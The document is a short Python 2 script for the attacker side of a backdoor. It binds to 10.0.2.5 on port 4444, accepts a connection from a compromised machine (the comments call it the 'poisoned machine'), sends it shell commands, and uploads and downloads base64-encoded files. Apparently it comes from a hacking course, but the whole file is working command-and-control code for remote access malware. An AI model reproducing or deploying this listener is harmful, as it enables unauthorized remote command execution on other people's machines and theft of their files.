#!/usr/bin/env python
import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, self.address = listener.accept()
        print("[+] Got a connection" + str(self.address))

    def reliable_send(self, data):
        json_data = json.dumps(data)  # converts data into json object
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)  # receives data of 1024 bytes
                return json.loads(json_data)  # unwraps data from json file
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.reliable_receive()  # receives data of 1024 bytes

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # decodes the encoded file from poisoned machine
            return "[+] Download successful."

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            # command = input(">> ") Use this for python3 implementation
            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(file_content)

            result = self.execute_remotely(command)  # sends list to backdoor

            if command[0] == "download":
                result = self.write_file(command[1], result)

            print(result)


my_listener = Listener("10.0.2.5", 4444)
my_listener.run()
